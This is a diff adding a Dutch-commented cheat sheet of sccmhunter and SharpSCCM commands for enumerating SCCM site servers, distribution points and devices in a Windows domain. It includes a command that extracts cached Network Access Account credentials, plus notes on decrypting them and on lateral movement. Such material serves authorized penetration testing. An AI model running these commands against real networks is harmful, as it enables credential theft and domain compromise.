@@ -1,0 +1,36 @@
+# SCCM Enumeratie — System Center Configuration Manager infrastructuur
+# Ontdek SCCM site servers, distribution points en management points
+#
+# === Vereisten ===
+# - Domain user account
+# - sccmhunter of SharpSCCM
+#
+# === Voorbeelden ===
+
+# sccmhunter - Automatische SCCM discovery
+python3 sccmhunter.py find -u USER -p 'PASS' -d DOMAIN
+
+# sccmhunter - Site info ophalen
+python3 sccmhunter.py show -u USER -p 'PASS' -d DOMAIN -dc-ip DC_IP
+
+# sccmhunter - Admin check
+python3 sccmhunter.py admin -u USER -p 'PASS' -d DOMAIN -dc-ip DC_IP
+
+# SharpSCCM - Local SCCM info
+.\SharpSCCM.exe local site-info
+
+# SharpSCCM - Alle devices ophalen
+.\SharpSCCM.exe get devices -sms SMS_SERVER -sc SITECODE
+
+# SharpSCCM - Software distribution points vinden
+.\SharpSCCM.exe get dp -sms SMS_SERVER -sc SITECODE
+
+# SharpSCCM - NAA credentials (Network Access Account) ophalen
+.\SharpSCCM.exe local naa -m wmi
+
+# Via LDAP query voor SCCM site servers
+python3 ldapsearch -u USER -p 'PASS' -d DOMAIN -dc DC_IP -b 'CN=System Management,CN=System,DC=domain,DC=local'
+
+# Noot: SCCM site servers hebben vaak hoge privileges (SYSTEM op clients)
+# Noot: NAA credentials worden lokaal gecached en zijn te decrypten
+# Noot: SCCM kan gebruikt worden voor lateral movement via app/script deployment
